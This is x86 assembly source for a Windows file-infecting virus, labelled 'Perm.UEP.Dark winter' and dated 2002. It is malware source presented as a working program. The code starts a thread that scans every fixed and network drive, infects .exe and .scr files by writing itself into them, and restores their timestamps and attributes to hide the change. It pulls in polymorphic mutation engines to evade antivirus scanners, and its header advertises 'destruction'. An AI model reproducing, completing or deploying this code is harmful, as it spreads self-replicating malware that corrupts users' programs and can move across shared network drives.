;DEBUG	= 1
;INT3 	= 1
TOOL	= 1

;ААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААА
;
; Perm.UEP.Dark winter
;
;  * permutation
;  * UEP
;  * destruction
;  * mutex callback
;
;  (c) 451 2002


include ldizx\ldizx.ash
include dee\dee.ash
include ltme\ltme.ash
include ltme\list.ash

include import.ash
include macros.ash
include win32api.ash
include pe.ash

includelib import32.lib
extrn ExitProcess:near
extrn MessageBoxA:near

        .586p
        .model flat
        .data
mText 		db ' ',10,13,0
        .code


_start:
                call _virstart
_replaced:

		xor eax,eax
                push MB_OK
		push eax
		push offset mText
		push eax
		call MessageBoxA

                push 0
                call ExitProcess


;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
virus_entry     equ     4 ptr[ebp]
temp_param	equ	     [ebp+4]

ifdef TOOL
		db	'TOL1'					; sign 1
endif

_virstart:

ifdef INT3
		@virdelta	=  8
                int 3
else
		@virdelta	=  7
endif

		pushad
		pushfd

		call delta
delta:
		pop edx

                ntsub <SIZE ltmeparam+4>
                mov ebp,esp

                mov temp_param.user_oldvirsize,virsize          ; л virus size
                mov temp_param.user_olddelta,@virdelta

		sub edx,temp_param.user_olddelta		; EDX = entry
                mov virus_entry,edx                             ;

;------------------------------------------------------------------------------
		pushx <SYS_MUTEX#>                              ;
		mov edx,esp                                     ;
		call openmutex					; Try to open 
		add esp,xsize					; callback mutex

		or eax,eax
		jnz callback_exit

;		EAX=0
;                xor eax,eax

		push eax					; stack hole

		push esp                                        ; pThreadID
		push eax	                                ; cflags=0
		push ebp					; param-heap
		pusho main_thread				; thread offset
		push eax                	                ; ssize=0
		push eax					; attributes=0
		kernelCall CreateThread
		or eax,eax
		pop eax
		jz callback_exit				; error?

;------------------------------------------------------------------------------
threadipc_wait:

		pushx <SYS_MUTEX#>                              ;
		mov edx,esp                                     ;
		call openmutex					; IPC
		add esp,xsize					;

		or eax,eax
		jz threadipc_wait

;------------------------------------------------------------------------------
callback_exit:

                ntadd <SIZE ltmeparam+4>
		popfd
		popad
		jmp _replaced					; л jmp


;л MAIN THREAD лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;virus_entry     equ     4 ptr[ebp]
;temp_param	 equ	     [ebp+4]

main_thread:
ifdef INT3
		int 3
endif

		mov esi,[esp+4]					; locals ptr
		mov ecx,SIZE ltmeparam+4			; already rounded
		sub esp,ecx                                     ;  on 4 byte bound

		mov ebp,esp                                     ; copy parent
		mov edi,ebp					; bufer
		rep movsb                                       ;

		pushx <SYS_MUTEX#>                              ;
		mov edx,esp                                     ; Set callback
		call addmutex					; 
		add esp,xsize					; 
		push eax

		pushx <C:\#>
		mov edx,esp

		pusho process_file
		pop ebx

		mov ecx,'Z'-'C'
;-----------------------------------------------------------------------------
scan_main:
		call getdrivetype

		cmp eax,DRIVE_FIXED
		je scan_disk
				
		cmp eax,DRIVE_REMOTE
		jne scan_disk_next
scan_disk:
		call walk
scan_disk_next:
		inc 1 ptr[edx]					; Next drive	
		dec ecx
		jnz scan_main
;-----------------------------------------------------------------------------
		add esp,xsize

		pop eax						; mutex handle
		call releasemutex
		call killobject


abcd:
		push 0
		kernelCall ExitThread


;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
; INFECT
;
;IN:	EDX=filename offset
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

process_file:
                pusha

                mov edi,edx
                xor eax,eax
                xor ecx,ecx
                dec ecx
                repnz scasb

                cmp [edi-4],'RCS'
                je  process_file_exe

                cmp [edi-4],'rcs'
                je  process_file_exe

                cmp [edi-4],'EXE'
                je  process_file_exe

                cmp [edi-4],'exe'
                jne process_file_exit

;------------------------------------------------------------------------------
process_file_exe:

ifdef DEBUG
;нннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннн
		pusha

		push edx

		pushx <infect.log#>
		mov edx,esp
		call fcreate
		add esp,xsize
		
		mov eax,FILE_END
		xor ecx,ecx
		call fseek

		pop edx

		xor eax,eax
		mov ecx,-1
		mov edi,edx
		repnz scasb
		neg ecx
		dec ecx

		call fwrite

		mov ecx,2
		pushx <~|>
		mov edx,esp
		call fwrite
		add esp,xsize
	
		call fclose
		popa
;нннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннн
endif

                call fgetattrb
                push eax                                	; get attributes
                push edx

                xor eax,eax                             	;
                call fsetattrb                          	; clear atrributes

                call fopen

                inc ebx                                 	;
                jz process_file_attrib                  	; error ?
                dec ebx                                 	;

                sub esp,3*(SIZE FILETIME)
                mov edi,esp                             	;
                call fgettime                           	; get date/time

;-----------------------------------------------------------------------------

                call fsize
		xchg eax,ecx

		push ecx                                	;
                call malloc                             	; file bufer
		add esp,4                               	; 

		or eax,eax          				; error?
		jz process_file_time                    	;

                xchg edx,eax					; EDX=bufer
                ;ECX=filesize					;
                ;EBX=handle                             	; Read file
                call fread                              	; 

;------------------------------------------------------------------------------

		;EDX=PE file bufer                      	;
		mov edi,ecx					; EDI=filesize
		lea eax,temp_param                      	; EAX=params
		mov ecx,temp_param.user_oldvirsize      	; ECX=virus size
		mov esi,virus_entry				; ESI=entry
                call infect                             	; 

		;EAX = bufer ,ECX=size(or FFFFFFFFh)

                inc ecx
                je process_file_time
		dec ecx

;------------------------------------------------------------------------------
		xchg edx,eax

		push ecx
                xor eax,eax					; seek
                xor ecx,ecx					;
                call fseek                              	;
		pop ecx


		; EDX= bufer
		; ECX= size
                ; EBX= handle
                call fwrite					; Write

ifdef DEBUG
;нннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннн
		pusha

		pushx <infect.log#>
		mov edx,esp
		call fcreate
		add esp,xsize

		mov eax,FILE_END
		xor ecx,ecx
		call fseek

		mov ecx,12
		pushx <infected!~|>
		mov edx,esp
		call fwrite
		add esp,xsize
	
		call fclose
		popa
;нннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннннн
endif



;АААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААААА
process_file_time:

		;EBX = handle
                mov edi,esp
                call fsettime
                add esp,3*(SIZE FILETIME)

                call fclose

		push edx                                	;
                call free                               	; release new file bufer
		add esp,4                               	;

process_file_attrib:

                pop edx
                pop eax
                call fsetattrb                          	; restore attributes

process_file_exit:

                popa
		ret


;------------------------------------------------------------------------------

include infect.inc

include import.inc
include system.inc
include search.inc
include fio.inc

include ldizx\ldizx.inc
include dee\dee.inc
include rnd\rnd.inc

include mutator.asm
include ltme\ltme_core.inc
include ltme\ltme_mutator.inc
virsize equ  $-offset _virstart

ifdef TOOL
		db	'TOL2'					; sign 2
endif

ascii_size	<virsize>
end     _start



